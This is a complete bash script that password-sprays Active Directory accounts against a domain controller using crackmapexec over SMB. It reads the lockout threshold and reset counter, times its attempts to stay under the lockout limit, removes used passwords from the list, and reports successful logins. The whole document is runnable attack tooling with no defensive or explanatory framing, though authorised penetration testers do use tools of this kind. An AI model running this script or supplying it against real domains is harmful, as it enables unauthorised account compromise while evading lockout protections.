#!/bin/bash
# Password spray AD accounts with crackmapexec according to reset counter and lockout threshold policies
# Author: Fabrizio Siciliano (@0rbz_)

which crackmapexec > /dev/null 2>&1
if [ $? == 1 ]; then
    echo "Can't find crackmapexec. This tool requires it."
    exit
fi

read -p "Enter the 'Reset Account Lockout Counter After' value: " reset_counter
read -p "Enter the 'Account Lockout Threshold' value: " lockout_threshold
read -p "Enter the Domain Controller IP Address: " dc_ip
read -p "Enter path to a password list: " passwords
read -p "Enter path to domain users list: " dom_users

checkpwns () {
    cat cmespray_output.txt | grep "[+]" 2>/dev/null
    if [ $? == 0 ]; then
        echo "[+] Successful logins:"
        cat cmespray_output.txt | grep "[+]"
    else
        echo "[-] No successful logins."
    fi
    cat cmespray_output.txt | grep "STATUS_ACCOUNT_LOCKED_OUT" 2>/dev/null
    if [ $? == 0 ]; then
        echo "[!] LOCKOUT DETECTED. EXITING."
        exit
    fi
}

while true; do
    # number of passwords to try from the list; lockout_threshold - 1
    pass_num=$(head -n $(echo $((lockout_threshold-1))) $passwords)
    echo "[*] Trying $(echo $((lockout_threshold-1))) passwords every $(echo $((reset_counter+1))) minutes against $(echo $dc_ip) and using $(echo $passwords) and $(echo $dom_users) lists."
    sleep 3
    for password in $pass_num; do
        crackmapexec smb $dc_ip -u $(cat $dom_users) -p $password | tee -a cmespray_output.txt
    done
    # remove used passwords from the list
    sed -i -e "1,$((lockout_threshold-1))d" $passwords
    checkpwns
    
	t='date +"%T"'
	echo "[+] Waiting $(echo $((reset_counter+1))) minutes..."
	echo "[+] Last run:" `$t`
	

    timer=$((reset_counter+1))
    sleep $timer\m
    if [[ ! -s $passwords ]]; then
        checkpwns
        echo "Done."
        exit
    fi
done
